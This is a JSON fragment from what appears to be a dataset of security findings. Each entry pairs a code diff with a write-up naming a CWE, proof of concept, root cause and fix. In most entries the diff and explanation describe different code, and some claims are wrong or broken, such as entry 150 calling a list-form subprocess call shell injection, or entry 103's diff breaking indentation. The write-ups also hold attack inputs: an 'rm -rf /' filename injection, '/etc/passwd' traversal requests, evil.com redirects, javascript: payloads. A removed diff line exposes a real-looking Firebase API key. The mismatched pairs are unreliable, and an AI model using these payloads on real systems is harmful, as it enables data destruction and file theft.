        "explanation": "Explanation: The code uses os.system() with string concatenation of user-controlled inputs without sanitization or validation, allowing arbitrary command injection.\n\n\nPOC:\nIf an attacker inputs a filename such as \"; rm -rf / # during the delete (//del) command, the constructed command becomes:\nrm -rf /root/\"; rm -rf / #\nwhich executes the dangerous rm -rf / command, potentially wiping the system.\n\n\nRoot Cause:\n\nspfm.py:\nLine 103: os.system(f'rm -rf {currentDir}/{r1}')\nLine 117: os.system(f'cd {currentDir} && cp {r1} {r2} && rm -rf {r1}')\n\nBoth use unsanitized user input r1 and r2 directly in shell commands.\n\n\nExploit Scenario:\nAn attacker inputs malicious filenames or directory names containing shell metacharacters to execute arbitrary commands with the privileges of the running script.\n\n\nWhy it Happens:\nLack of input validation and use of os.system() with string formatting allows shell injection.\n\n\nSecurity Implications:\nFull system compromise, data loss, privilege escalation, or denial of service.\n\n\nSuggested Fix:\nUse Python's subprocess module with argument lists to avoid shell interpretation:\n\nimport subprocess\n\n# For delete\nsubprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)\n\n# For rename (copy + delete)\nsubprocess.run(['cp', os.path.join(currentDir, r1), os.path.join(currentDir, r2)], check=True)\nsubprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)"
    },
    "103": {
        "diff": "--- shop.py     2025-04-27 13:29:30.000000000 -0400\n+++ shop-new.py 2025-04-27 13:29:30.000000000 -0400\n@@ -5,7 +5,7 @@\n import operator\n import datetime\n import webbrowser\n-\n+import os\n \n conn = pymysql.connect(host=\"localhost\",user=\"root\",password=\"root123\",db=\"foodmenu\")\n curs = conn.cursor()\n@@ -88,14 +88,18 @@\n                self.proceed_button.pack(side=BOTTOM)\n \n        def getMenu(self):\n-               self.menu = foodmenu.Menu()\n-               sqlQuery = \"SELECT * FROM \"+self.name+\"_menu\"\n-               curs.execute(sqlQuery)\n-               foods = curs.fetchall()\n-               for values in foods:\n-                       food = foodmenu.Food(*values)\n-                       self.menu.add(food)\n-               self.menu.reduceRanks()\n+    self.menu = foodmenu.Menu()\n+    # Only allow alphanumeric and underscores in table names\n+    if not re.match(r'^\\w+$', self.name):\n+        raise ValueError(\"Invalid shop name\")\n+    table_name = f\"{self.name}_menu\"\n+    sqlQuery = f\"SELECT * FROM `{table_name}`\"\n+    curs.execute(sqlQuery)\n+    foods = curs.fetchall()\n+    for values in foods:\n+        food = foodmenu.Food(*values)\n+        self.menu.add(food)\n+    self.menu.reduceRanks()\n \n        def clearEditFrame(self):\n                for widget in self.editFrame.winfo_children():",
        "explanation": "C++ Library Management System - Logical Flaws in Book Management\n\n---\n\nAffected Components:  \n- `bookissue()` and `bookdeposit()` functions in `LMSCode.cpp`  \n- `book` and `student` class logic  \n\n---\n\nRoot Cause:  \n1. Missing Book Status Tracking:  \n   The `book` class lacks an `issued` flag or copy counter, allowing the same book to be issued to multiple students.  \n2. Incorrect Fine Calculation:  \n   The formula `(day-15)*1` in `bookdeposit()` hardcodes a 1 Rs/day fine instead of 15 Rs/day.  \n3. No Validation for Returns:  \n   Students can return books they never borrowed, corrupting the `token` system.  \n4. Unrestricted Token Logic:  \n   The `token` variable is not linked to actual book availability, enabling over-issuance and invalid returns.  \n\n---\n\nExploit Scenarios:  \n1. Duplicate Book Issuance:  \n1. Admin creates a book (`bno = \"B101\"`).  \n2. Student A (`admno = \"S001\"`) issues `B101` successfully.  \n3. Student B (`admno = \"S002\"`) issues `B101` again.  \nResult: Both students hold the same book, leading to inventory chaos.  \n2. Financial Loss via Incorrect Fines:  \n1. Student returns a book after 20 days.  \n2. System calculates fine as `(20-15)*1 = 5 Rs` instead of `(20-15)*15 = 75 Rs`.  \nResult: Financial loss due to undercharging.  \n\n3. Invalid Book Returns:  \n1. Student `S001` (with no issued books) selects \"Book Deposit\".  \n2. System resets their `token` to `0` despite no prior issuance.  \nResult: Data inconsistency in `student.dat`.  \n\n---\n\nWhy It Happens:  \n- No Book Status: The `book` class does not track issuance state.  \n- Hardcoded Fine Logic:  \n  ```cpp\n  // Flawed calculation in bookdeposit()\n  fine = (day-15)*1; // Should be (day-15)*15\n  ```  \n- Lax Token Checks:  \n  ```cpp\n  // Missing validation in bookdeposit():\n  if (token == 1) { ... } // No check for actual book ownership\n  ```  \n\n---\n\nSecurity Implications:  \n- Data Corruption: Inventory mismanagement due to duplicate issuance.  \n- Financial Loss: Incorrect fines undercharge users.  \n- Operational Failure: Invalid returns/issuances make the system unreliable.  \n\n---\n\nSuggested Fixes:  \n1. Add Book Status Tracking:  \n   ```cpp\n   class book {\n     // ...\n     bool issued; // New field\n     int copies;  // Track available copies\n   };\n   ```  \n2. Validate Book Availability:  \n   ```cpp\n   // In bookissue():\n   if (bk.copies > 0) {\n     bk.copies--; // Decrement on issuance\n     st.addtoken();\n   } else {\n     cout << \"Book unavailable!\";\n   }\n   ```  \n3. Correct Fine Calculation:  \n   ```cpp\n   fine = (day > 15) ? (day - 15) * 15 : 0;\n   ```  \n4. Enforce Return Validation:  \n   ```cpp\n   // In bookdeposit():\n   if (st.rettoken() == 0) {\n     cout << \"No book issued!\";\n     return;\n   }\n   ```  \n\n---\n\n\nProof of Concept (PoC):  \nSteps:  \n1. Create a Book:  \n   - `bno = \"B101\"`, `copies = 1` (if implemented).  \n2. Issue to Student A:  \n   - `S001` issues `B101` (successful).  \n3. Issue to Student B:  \n   - `S002` issues `B101` (successful if no copy tracking).  \n4. Return After 20 Days:  \n   - Fine displayed: 5 Rs (incorrect).  \n\nOutput:  \n```plaintext\nBook B101 issued to S001  \nBook B101 issued to S002  <-- Flaw: Duplicate issuance  \nFine for S001: 5 Rs       <-- Flaw: Should be 75 Rs  \n```  \n\n---\nMitigation:  \nImplement the fixes above to ensure:  \n- Books cannot be over-issued.  \n- Fines reflect the correct rate.  \n- Returns require valid prior issuance."
    },
    "135": {
        "diff": "--- JobDataService.cs\t2025-04-27\n+++ JobDataService_fixed.cs\t2025-04-27\n@@\n- JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };\n+ JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None };\n",
        "explanation": "Vulnerability Type:\nCWE-601: URL Redirection to Untrusted Site (\u2018Open Redirect\u2019)\nOWASP A01:2021 \u2013 Broken Access Control\n\n Proof of Concept:\n\n<a href={`${auth?.user?.userId}`} className=\"side-nav-link\">\nThe userId value from the auth context is directly embedded into an <a href>.\n\nIf an attacker injects a value like //evil.com, the browser interprets this as an external link, causing redirection to an attacker-controlled domain.\n\nFor example:\n\nauth.user.userId = \"//evil.com\"\nClicking the \"Profile\" button would navigate the victim to https://evil.com.\n\n Severity:\nCritical\nThis is a high-risk vulnerability due to its potential for phishing, redirect loops, and session hijacking.\n\n Root Cause:\nThe application directly inserts user-controlled input (auth.user.userId) into an anchor tag\u2019s href attribute without validating or sanitizing the input. Browsers treat certain prefixes (e.g., //, http://, javascript:) as absolute URLs or JavaScript payloads, enabling unintended behaviors.\n\n Exploit Scenario:\nAn attacker registers or modifies their account\u2019s userId to \"//evil.com\" or \"javascript:alert('hacked')\". When any user clicks the \u201cProfile\u201d button from the sidebar, they are unknowingly redirected to a malicious website, potentially leading to phishing, credential theft, or malware distribution.\n\n Why It Happens:\nThe system assumes that the userId is safe and represents an internal routing path. However, without constraints or validation, it opens the door for injection of arbitrary URL schemes (e.g., http, javascript) or redirection outside the trusted domain. The design lacks input sanitization or type-checking for routing values.\n\nSecurity Implications:\nIf exploited:\n\nUsers may be redirected to malicious external sites.\n\nCan lead to phishing attacks, token/session theft, or loss of user trust.\n\nCould be used for clickjacking, social engineering, or XSS payload delivery via javascript: links.\n\nBreaks internal navigation, leading to routing logic abuse or privilege escalation.\n\nSuggested Fix:\nNever use user-controlled data directly in <a href> or routing links.\n\nUse internal-only routing via React Router\u2019s Link:\n\n\n<Link to={`/profile/${auth?.user?.userId}`} className=\"side-nav-link\">...</Link>\n Validate userId format before routing (e.g., only allow alphanumeric/slug-safe IDs using regex).\n\nSanitize or reject dangerous values (javascript:, //, http:) on both frontend and backend.\n\nOptionally, encode the ID or use a centralized route resolver that can whitelist safe paths."
    },
    "132": {
        "diff": "--- a/server.py\n+++ b/server.py\n@@ def create_app(run_mode: str = None):\n-    if OPEN_CROSS_DOMAIN:\n-        app.add_middleware(\n-            CORSMiddleware,\n-            allow_origins=[\"*\"],\n-            allow_credentials=True,\n-            allow_methods=[\"*\"],\n-            allow_headers=[\"*\"],\n-        )\n+    if OPEN_CROSS_DOMAIN:\n+        allowed_origins = [\"https://yourdomain.com\", \"https://trusted.example.com\"]\n+        app.add_middleware(\n+            CORSMiddleware,\n+            allow_origins=allowed_origins,\n+            allow_credentials=True,\n+            allow_methods=[\"GET\", \"POST\", \"OPTIONS\"],\n+            allow_headers=[\"Content-Type\", \"Authorization\"],\n+        )\n",
        "explanation": "Vulnerability Type:\nCWE-706: Use of Incorrectly-Resolved Name or Reference\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nCWE-20: Improper Input Validation\nOWASP A01:2021 \u2013 Broken Access Control\nOWASP A07:2021 \u2013 Cross-Site Scripting (XSS)\n\n Proof of Concept:\nNavigation via Unvalidated item.id:\n\nonClick={() => navigate(`/movies/${item.id}`)}\nIf a malicious item.id like ../../admin or /evil is injected into Firestore, the app could navigate to unintended paths.\n\nUnsafe <img src={item.url}>:\n\n<img src={item.url} alt=\"\" />\nIf item.url is javascript:alert(1), some browsers might trigger JavaScript execution or log security warnings.\n\nNo Error Handling:\n\nFailure of Firestore fetch (getDocs) is not caught, so users see an infinite spinner and no error message.\n\n Severity:\nMedium\n\nThese are not remote code execution issues, but:\n\nBroken routing\n\nStored XSS (if browser accepts javascript: URLs)\n\nUnhandled API errors\n\nAll significantly impact user experience, security, and trust.\n\n Root Cause:\nThe application trusts data from Firestore (a user-controllable database) without validating id or url fields. Additionally, there is no error handling logic around async data fetching, leading to infinite loading states and potential exposure to crafted input.\n\nExploit Scenario:\nAn attacker with write access to Firestore (or who tricks an admin into creating a bad record) inserts:\n\n{\n  \"id\": \"../../admin\",\n  \"url\": \"javascript:alert('hacked')\"\n}\nThen convinces users to visit the /movies page. Clicking the card can:\n\nTrigger navigation to a restricted area (/admin)\n\nExecute malicious scripts via img tag if not properly sanitized\n\n Why It Happens:\nThere is no validation layer between Firestore and the frontend React code. The code assumes that all Firestore records are trustworthy. React doesn't automatically sanitize src, href, or id values, so improper use can lead to navigation tampering or script execution.\n\nSecurity Implications:\nIf exploited:\n\nMalicious IDs can lead to unintended page routing or IDOR\n\nUnsafe image URLs can trigger XSS on older or less secure browsers\n\nApp can break (or hang) due to unhandled async errors\n\nUsers lose trust and the app is exposed to social engineering\n\n Suggested Fix:\nValidate item.id before passing into router \u2014 allow only alphanumeric or safe characters (e.g., regex: /^[a-zA-Z0-9_-]+$/)\n\nValidate item.url with URL() constructor and only allow https: or http:\n\nWrap Firestore fetches in try-catch and show a fallback UI if it fails\n\nSanitize image input before storing in Firestore (preferred), or validate at render time (minimum)\n\n"
    },
    "166": {
        "diff": "--- lambda_handler.py\n+++ lambda_handler.py\n@@ def return_customer_info(custName):\n-    query = 'SELECT customerId, customerName, Addr1, Addr2, City, State, Zipcode, PreferredActivity, ShoeSize, OtherInfo from CustomerInfo where customerName like \"%' +  custName +'%\"'\n-    cursor.execute(query)\n+    query = 'SELECT customerId, customerName, Addr1, Addr2, City, State, Zipcode, PreferredActivity, ShoeSize, OtherInfo from CustomerInfo WHERE customerName LIKE ?'\n+    cursor.execute(query, (f'%{custName}%',))\n@@ def place_shoe_order(ssId, custId):\n-    query = 'Update ShoeInventory set InvCount = InvCount - 1 where ShoeID = ' + str(ssId)\n-    ret = cursor.execute(query)\n+    query = 'UPDATE ShoeInventory SET InvCount = InvCount - 1 WHERE ShoeID = ?'\n+    ret = cursor.execute(query, (ssId,))\n     \n-    today = datetime.today().strftime('%Y-%m-%d')\n-    query = 'INSERT INTO OrderDetails (orderdate, shoeId, CustomerId) VALUES (\"'+today+'\",'+str(ssId)+','+ str(custId)+')'\n-    ret = cursor.execute(query)\n+    today = datetime.today().strftime('%Y-%m-%d')\n+    query = 'INSERT INTO OrderDetails (orderdate, shoeId, CustomerId) VALUES (?, ?, ?)'\n+    ret = cursor.execute(query, (today, ssId, custId))\n",
        "explanation": "Vulnerability Type:\nCWE-668: Exposure of Resource to Wrong Sphere\n\nProof of Concept:\nIn the app.py file, the Flask application is started with the following line:\napp.run(host='0.0.0.0', port=5000)\nThe host value 0.0.0.0 binds the Flask server to all network interfaces, including public-facing IP addresses. This allows the Flask app to accept incoming connections from any machine that can reach the server\u2019s IP address and port, potentially exposing APIs unintentionally. If deployed without additional security measures, this configuration makes the server easily discoverable and accessible by attackers or unauthorized users, even over the internet.\n\nSeverity:\nMedium\n\nRoot Cause:\nThe root cause of this vulnerability is the misconfiguration of the Flask application\u2019s host binding. Setting the host to 0.0.0.0 tells the operating system to listen for incoming connections on all available network interfaces, including interfaces connected to untrusted networks. This configuration is commonly used during development for testing across devices but is unsafe when accidentally deployed in production without proper network access restrictions or security controls in place.\n\nExploit Scenario:\nAn attacker scanning a public or private network can detect that the Flask application is listening on port 5000. By sending specially crafted HTTP requests to exposed endpoints, the attacker can interact with the application, retrieve data, invoke functionality that was never meant for public access, or even chain this access with other vulnerabilities such as authentication bypasses or injection attacks. This exposure significantly lowers the barrier for remote exploitation.\n\nWhy It Happens:\nDevelopers often configure Flask apps with host=0.0.0.0 to make them reachable from other devices during local development and testing. However, if this setting is not changed back before deploying to production or cloud environments, the server remains accessible to anyone who can route to the machine. Flask's built-in server is intended only for development use and lacks production-grade security features, making the exposure risk even greater.\n\nSecurity Implications:\nLeaving the server bound to 0.0.0.0 in production can lead to unauthorized access, information leakage, abuse of internal APIs, exposure of sensitive operations, and increased risk of broader system compromise. Attackers could potentially access functionality that was never meant to be public, causing financial loss, reputation damage, or data breaches. In worst-case scenarios, it could lead to full system takeovers if the server runs with elevated privileges or has additional unpatched vulnerabilities.\n\nSuggested Fix:\nThe Flask application should be configured to bind only to the loopback address 127.0.0.1 to limit access exclusively to the local machine. This prevents external systems from reaching the application directly. For production deployments, a production-grade WSGI server like Gunicorn should be used behind a properly secured reverse proxy (e.g., Nginx) with firewall rules restricting traffic. The corrected code should be:\napp.run(host='127.0.0.1', port=5000)\nThis approach ensures that internal services are protected and minimizes the attack surface.\n"
    },
    "168": {
        "diff": "--- app.py\n+++ app.py\n@@ def mcmt():\n     features = request.json['X']\n     return make_response(jsonify({'score': features}))\n\n if __name__ == '__main__':\n-    app.run(host='0.0.0.0', port=5000)\n+    app.run(host='127.0.0.1', port=5000)\n",
        "explanation": "Root Cause Analysis:\n\nThe upload_files() function directly writes the uploaded file to disk using its original filename without checking for duplicates:\n\nfile_path = UPLOADS_DIR / file.filename\nwith open(file_path, \"wb\") as f:\n    content = await file.read()\n    f.write(content)\n\nExploit Scenarios:\n\nA malicious user could overwrite critical files uploaded by others, leading to denial of service or data corruption.\nAn attacker could replace legitimate files with malicious ones, potentially leading to remote code execution.\n\nSecurity Implications: 1. Data Corruption\n2. Denial of Service\n3. Remote Code Execution\n\nSuggested Fix: Add a mechanism to generate unique filenames for uploaded files:\n\nimport uuid\n\ndef secure_filename(filename):\n    unique_id = uuid.uuid4().hex\n    return f\"{unique_id}_{filename}\"\n\n@app.post(\"/api/upload\")\nasync def upload_files(files: list[UploadFile] = File(...)):\n    for file in files:\n        secure_name = secure_filename(file.filename)\n        file_path = UPLOADS_DIR / secure_name\n        with open(file_path, \"wb\") as f:\n            content = await file.read()\n            f.write(content)"
    },
    "157": {
        "diff": "diff --git a/registration.py b/registration.py\nindex abcdef1..1234567 100644\n--- a/registration.py\n+++ b/registration.py\n@@ def realm_redirect(request: HttpRequest, *, next: str = \"\") -> HttpResponse:\n-            if next:\n-                redirect_to = append_url_query_string(\n-                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n-                )\n+            from django.utils.http import url_has_allowed_host_and_scheme\n+            if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):\n+                redirect_to = append_url_query_string(\n+                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n+                )\n",
        "explanation": "Vulnerability Type:CWE-36: Absolute Path Traversal.\npath:ModelConverter\\web\\hello.py\nProof of Concept:\nVulnerable Code:\n\n@app.route('/download', methods=['GET'])\ndef download():\n    username = request.args.get('username')\n    filename = request.args.get('filename')\n    return send_file(os.path.join(DOWNLOAD_FOLDER, username, filename), as_attachment=True)\nExplanation:\nThe above code takes user input (username and filename) and joins it using os.path.join() to form a file path. However, this function does not prevent path traversal when given malicious input. An attacker can exploit this by inserting relative paths such as ../../../../etc/passwd. This bypasses the intended directory and exposes files outside of the download folder. The send_file function will then serve these unauthorized files.\n\nSeverity:\nCritical\n\nRoot Cause:\nThe root cause of the issue is the use of os.path.join() with untrusted input to construct file paths. If the input contains absolute paths or traversal sequences, os.path.join() may resolve the path to locations outside the safe directory. Since the input is not validated before being used in the send_file() function, the attacker can fully control what file is read and served by the application.\n\nExploit Scenario:\nAn attacker crafts a request like:\n\nhttp://localhost/download?username=../../&filename=../../../../etc/passwd\nThis causes the joined path to resolve to a sensitive file outside the download directory. If the server is configured to allow such downloads, the attacker receives the contents of /etc/passwd or any other accessible file. Repeating this attack with various paths can result in the leakage of configuration files, source code, or other internal resources.\n\nWhy It Happens:\nThe vulnerability occurs because the application directly incorporates user input into file path operations without verifying that the final path remains within an allowed directory. The use of os.path.join() does not perform any security checks, allowing input like ../ or absolute paths to override intended behavior. This results in paths that escape the designated file directory, leading to unauthorized access.\n\nSecurity Implications:\nIf successfully exploited, the vulnerability allows attackers to access sensitive server-side files. This can include system configuration files, database credentials, or internal application logic. The exposure of such files could lead to further system compromise, privilege escalation, or lateral movement within the network. It also undermines data confidentiality and increases the risk of information leakage to unauthorized users.\n\nSuggested Fix:\nReplace os.path.join() with werkzeug.utils.safe_join(), which securely joins paths and ensures that the final resolved path stays within the base directory. If the result attempts to traverse outside the base path, safe_join() returns None or raises an error. This prevents path traversal attacks by validating the complete path after joining. Here is the fixed code:\n\n    safe_path = safe_join(DOWNLOAD_FOLDER, username, filename)\n    return send_file(safe_path, as_attachment=True)\nThis ensures that file access is limited to the intended directory, preventing attackers from reaching unauthorized files."
    },
    "150": {
        "diff": "@@\n- const oldNot = req.body.oldNot;\n- const newNot = req.body.newNot;\n+ const { oldNot, newNot } = req.body;\n+ if (!mongoose.Types.ObjectId.isValid(oldNot._id)) {\n+   return res.status(400).send(\"Invalid notification ID format\");\n+ }\n+ if (typeof newNot.message !== 'string') {\n+   return res.status(400).send(\"Invalid notification message format\");\n+ }\nawait Notification.findOneAndUpdate({ _id: oldNot._id, to: user }, newNot).exec()\n",
        "explanation": "The code contains one critical (CWE-78-OS_Command_Injection) and one high severity (CWE-22-Path_Traversal) issue \n============================================================\nCWE-22: \nExplanation: \nThe code constructs paths using unsanitized user input, allowing attackers to access arbitrary files.\n\nPOC:\n\n# As attacker, provide \"../\" sequences in parent_folder/folder_name inputs\nParent: \"../../../../..\"\nFolder: \"etc\"\n# Moves file to ~/../../../../../etc (system directory)\n\n\nRoot Cause: File FileManager.py\nmoveFile(): parent_folder/folder_name inputs (Line 15-16)\nopenFile(): found_file input (Line 34)\nsearchComputer(): filename/filetype inputs (Line 51-52)\n\n\nExploit Scenario: \nAttacker reads /etc/passwd or overwrites system files.\n\n\nWhy it Happens: \nLack of input validation and path sanitization.\n\n\nSecurity Implications: \nData theft, system compromise through arbitrary file read.\n\n\nSuggested Fix:\n\nfrom pathlib import Path\n\ndef sanitize_path(user_input):\n    path = Path(user_input).name  # Remove path traversal sequences\n    return str(Path.home() / \"secure_folder\" / path)  # Restrict to safe base dir\n\n=====================================================================================\n\nCWE-78:\nExplanation: \nsubprocess.run(['open', found_file]) executes shell commands with untrusted input.\n\n\nPOC:\nCreate malicious filename: \"file; rm -rf /\"\nTriggers command injection when the file is opened\n\n\nRoot Cause: File FileManager.py\nLine 44 (subprocess.run(['open', found_file]))\n\n\nExploit Scenario: \nAttacker deletes files or spawns reverse shells.\n\n\nWhy it Happens: \nDirect use of user-controlled input in shell commands.\n\n\nSecurity Implications: \nArbitrary Command Execution leading to full system compromise.\n\n\nSuggested Fix:\nPatch:\n# Use secure file open instead\nos.startfile(found_file)  # Windows/macOS safe alternative\n# OR validate filename with strict regex first"
    },
    "33": {
        "diff": "diff --git a/vulnerable.c b/vulnerable.c\nindex abcdef1..1234567 100644\n--- a/vulnerable.c\n+++ b/vulnerable.c\n@@ void process_input(const char* input, int length) {\n-    char buffer[16];\n-    memcpy(buffer, input, length);\n+    char buffer[16];\n+    int safe_length = length < 16 ? length : 15;\n+    memcpy(buffer, input, safe_length);\n+    buffer[safe_length] = '\\0'; // Ensure null-termination\n}",
        "explanation": "Vulnerability Type: CWE-787: Out-of-bounds Write\n\nOWASP Top 10: This lines up with multiple OWASP Top 10 categories. They are- A04:2021 - Insecure Design, A05:2021 - Security Misconfiguration, and A07:2021 - Identification and Authentication Failures\n\nSeverity: High (4)\n\nRoot Cause: JavaScript passes input of arbitrary length to a WebAssembly-exposed C++ function that copies data into a fixed-size C++ buffer without validating length.\n\nExploit Scenario: A malicious user could craft a long input string via JavaScript and pass it to writeToBuffer(), causing it to overwrite memory beyond the 16-byte array boundary in C++.\n\nWhy It Happens: The C++ function blindly trusts the len argument, failing to check whether it fits the destination buffer. Since WebAssembly memory is accessible from both C++ and JavaScript, this creates a cross-language memory corruption bug.\n\nSecurity Implications: Could lead to memory corruption, data leakage, crashes, or even remote code execution in unsafe configurations.\n\nSuggested Fix: Add explicit bounds checking before copying. Limit the length to the buffer\u2019s size."
    },
    "34": {
        "diff": "diff --git a/buffer_test.cpp b/buffer_test.cpp\nindex abcdef1..1234567 100644\n--- a/buffer_test.cpp\n+++ b/buffer_test.cpp\n@@ void writeToBuffer(const char* input, int len) {\n-        memcpy(buffer, input, len);\n+        int safe_len = len > 16 ? 16 : len;\n+        memcpy(buffer, input, safe_len);",
        "explanation": "Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)\n\nSeverity: Critical (5)\n\nOWASP Category: A10:2021 \u2013 Server-Side Request Forgery (SSRF)\n\nRoot Cause:\nThe webhook validation logic in Gogs (`internal/route/repo/webhook.go`) only checks the hostname of the webhook target, not its fully resolved IP. This allows attackers to provide DNS names that resolve to internal/private IP addresses.\n\nExploit Scenario:\nAn attacker creates a webhook targeting `http://ssrf.attacker.com`. The hostname is allowed by the current code, but `ssrf.attacker.com` resolves to `127.0.0.1`. Gogs then sends a POST request to this internal IP, potentially triggering sensitive internal behavior (e.g., local metadata services, internal APIs, cloud providers, etc.).\n\nWhy It Happens:\nThe current implementation of `validateWebhook()` calls `IsBlockedLocalHostname()` using only the hostname string, not the resolved IP address.\n\nSecurity Implications:\n- Unauthenticated access to internal-only services\n- Potential Remote Code Execution (RCE) if internal endpoints are accessible\n- Trust boundary violation\n- Possible lateral movement or privilege escalation\n\nSuggested Fix:\nUpdate `validateWebhook()` to perform a DNS resolution and reject any IP addresses in private/reserved ranges (e.g., 127.0.0.1, 10.0.0.0/8, 192.168.0.0/16)."
    },
    "5": {
        "diff": "--- a/firebase.js\n+++ b/firebase.js\n@@ -1,11 +1,22 @@\n-import { initializeApp } from \"firebase/app\";\n-\n-const firebaseConfig = {\n-  apiKey: \"AIzaSyDJhjHc9xsxfD8jMRtu0mFmamScGrJzCbs\",\n-  authDomain: \"fir-eed0e.firebaseapp.com\",\n-  projectId: \"fir-eed0e\",\n-  storageBucket: \"fir-eed0e.appspot.com\",\n-  messagingSenderId: \"702932216448\",\n-  appId: \"1:702932216448:web:d73b9538544b2ff3ca1465\",\n-  measurementId: \"G-BE7T69C8Q9\",\n-  databaseURL: \"https://fir-eed0e-default-rtdb.firebaseio.com\"\n-};\n-\n-// Initialize Firebase\n-export const app = initializeApp(firebaseConfig);\n+import { initializeApp } from \"firebase/app\";\n+\n+const firebaseConfig = {\n+  apiKey: process.env.REACT_APP_FIREBASE_API_KEY,\n+  authDomain: process.env.REACT_APP_FIREBASE_AUTH_DOMAIN,\n+  projectId: process.env.REACT_APP_FIREBASE_PROJECT_ID,\n+  storageBucket: process.env.REACT_APP_FIREBASE_STORAGE_BUCKET,\n+  messagingSenderId: process.env.REACT_APP_FIREBASE_MESSAGING_SENDER_ID,\n+  appId: process.env.REACT_APP_FIREBASE_APP_ID,\n+  measurementId: process.env.REACT_APP_FIREBASE_MEASUREMENT_ID,\n+  databaseURL: process.env.REACT_APP_FIREBASE_DATABASE_URL,\n+};\n+\n+// Initialize Firebase\n+export const app = initializeApp(firebaseConfig);",
        "explanation": "Path to File: \"http_server\\src\\api_server\\main.cpp\"\n\nVulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\nOWASP Category: A05:2021 \u2013 Security Misconfiguration\n\nSeverity: High(4)\n\nRoot Cause:\nThe server directly uses user-supplied HTTP request paths without sanitization or canonicalization, allowing directory traversal attacks.\n\nExploit Scenario:\nA remote attacker sends an HTTP GET request with a path like /../../etc/passwd, causing the server to open and send arbitrary files outside the intended directory.\n\nWhy It Happens:\nThe input (requested URL path) is used directly with file system operations without proper validation, enabling path traversal.\n\nSecurity Implications:\nAttackers can read sensitive server files, such as password files or SSH keys, leading to serious security breaches.\n\nSuggested Fix:\nSanitize incoming paths, block paths containing \"..\" sequences, and restrict file access to within a predefined base directory."
    },
    "56": {
        "diff": "--- lib/config.js\n+++ lib/config.js\n@@ function config(obj) {\n-  for (let key in obj) {\n-    this[key] = obj[key]; // No protection against __proto__\n+  for (let key in obj) {\n+    if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;\n+    this[key] = obj[key];\n   }\n}",
        "explanation": "Vulnerability Type: CWE-693 Protection Mechanism Failure - Missing HTTP Security Headers\n\nProof of Concept: In the index.js file-\n\nimport express from \"express\";\nimport bodyParser from \"body-parser\";\n\nimport usersRoutes from \"./routes/users.js\";\n\nconst app = express();\nconst PORT = 5000;\n\napp.use(bodyParser.json());\n\napp.use(\"/people\", usersRoutes);\napp.get(\"/\", (req, res) => res.send(\"Welcome to the Users API!\"));\napp.all(\"*\", (req, res) =>res.send(\"You've tried reaching a route that doesn't exist.\"));\n\napp.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));\n\nHere it is clear that the Express app is initialized without applying helmet, a middleware that sets security-related HTTP headers like X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security.\n\nThis can be secured by adding the helmet middleware which will add the security headers in the response of the server. The secure code will now become-\n\nimport express from \"express\";\nimport bodyParser from \"body-parser\";\nimport helmet from \"helmet\";      //here we import helmet middleware\n\nimport usersRoutes from \"./routes/users.js\";\n\nconst app = express();\nconst PORT = 5000;\n\napp.use(bodyParser.json());\napp.use(helmet());                     //Here we use the helmet middleware so that it can add the security headers to the request\n\napp.use(\"/people\", usersRoutes);\napp.get(\"/\", (req, res) => res.send(\"Welcome to the Users API!\"));\napp.all(\"*\", (req, res) =>res.send(\"You've tried reaching a route that doesn't exist.\"));\n\napp.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));\n\nSeverity: 3 (Medium)\n\nRoot Cause: The application does not apply the helmet middleware, leading to missing security headers in HTTP responses. Without these protections, the application leaves the browser and users vulnerable to common client-side exploits.\n\nExploit Scenario: An attacker could create a malicious website that frames the Users API (clickjacking attack) or tries to execute a reflected XSS attack through API responses. Since protections like X-Frame-Options and Content-Security-Policy are missing, the browser would not block these malicious activities.\n\nWhy It Happens: The developers initialized an Express server but did not add middleware to set security headers. As a result, the server responds to HTTP requests without any browser-level security directives enforced.\n\nSecurity Implications: An attacker could frame the application in a malicious page (clickjacking), inject scripts into responses (XSS), trick browsers into executing unintended code, or exploit HTTP response sniffing vulnerabilities. This could lead to unauthorized actions, theft of session data, or defacement of the API's front-end if integrated.\n\nSuggested Fix:\nInstall and apply the helmet middleware in the Express app. Add import helmet from 'helmet'; and call app.use(helmet()); early in the middleware chain to automatically add common secure HTTP headers to all responses."
    },
    "2": {
        "diff": "--- Users.py    2025-04-22 21:02:20.999514889 +0530\n+++ Users-patch.py      2025-04-22 21:02:39.889504715 +0530\n@@ -43,7 +43,8 @@\n     while True:\n         print()\n         UserID=input(\" Enter UserID whose details to be deleted : \")\n-        mycursor.execute(\"DELETE from UserRecord where UserID = {0} \".format(\"\\'\"+UserID+\"\\'\"))\n+        query = \"DELETE FROM UserRecord WHERE UserID = %s\"\n+        mycursor.execute(query, (UserID,))\n         mydb.commit()\n         ch=input(\"Do you wish to delete more Users?[Yes/No] : \")\n         if ch==\"no\" or ch==\"No\" or ch==\"NO\":",
        "explanation": "Root Cause: The vulnerability arises because the id value from the component state is directly injected into window.location.href without sanitization. This unsanitized input is used to construct a URL hash that could contain malicious scripts.\n\nExploit Scenario: An attacker could craft a malicious id value (e.g., #<script>alert('XSS')</script>) and trick a user into copying the generated URL. When the victim visits the URL, the script executes in their browser, leading to session hijacking or data theft.\n\nWhy It Happens: The code trusts user-controlled id values (passed via deltaState.id) and directly appends them to the URL hash. No validation or encoding is applied to prevent HTML/JavaScript injection in the client-side DOM.\n\nSecurity Implications: Attackers can execute arbitrary JavaScript in the victim\u2019s browser, enabling actions like stealing cookies, redirecting to phishing sites, or performing unauthorized actions on behalf of the user.\n\nSuggested Fix: Sanitize the id parameter using a library like DOMPurify or encode it with encodeURIComponent() before appending to the URL. Ensure only alphanumeric/safe characters are allowed in the id field via input validation."
    },
    "69": {
